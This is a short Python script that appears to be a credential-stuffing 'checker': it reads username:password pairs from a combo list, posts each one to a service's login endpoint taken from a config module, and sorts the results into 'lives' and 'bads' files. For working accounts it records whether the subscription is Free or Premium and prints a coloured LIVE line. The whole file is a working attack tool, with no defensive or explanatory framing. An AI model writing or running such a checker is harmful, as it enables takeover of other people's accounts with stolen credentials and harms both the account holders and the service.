import json
import os
from urllib.parse import urlparse, quote
import socket

import _patches
import _sync
from _config import endpoint, headers, timeout
from _files import content, bads, lives
from _http import create_connection, get_encoded_content

scheme, netloc, path, *config = urlparse(endpoint)

for login in content:
    try:
        username, password = login.split(":")
        password = password.strip("\n")
    except ValueError:
        continue

    body = {
        "username": quote(username),
        "password": quote(password)
    }

    raw_body = ""

    for key, value in body.items():
        raw_body += f"{key}={value}&"

    raw_body = raw_body.rstrip("&")

    connection = create_connection(scheme, netloc)

    try:
        connection.request("POST", path, body=raw_body, headers=headers)
        response = connection.getresponse()
    except socket.timeout:
        continue

    body = get_encoded_content(response)
    dict = json.loads(body)

    if dict["success"]:
        account_type = dict["data"]["subscription_caption"]
        account_type = "Free" if account_type == "" else "Premium"
        lives.write(f"{username}|{password}|{account_type}\n")
        print(f"\x1b[32m-> LIVE: {username}|{password}|{account_type} \x1b[0m")
    else:
        bads.write(f"{username}|{password}\n")
        print(f"\x1b[31m-> BAD: {username}|{password} \x1b[0m")

bads.close()
lives.close()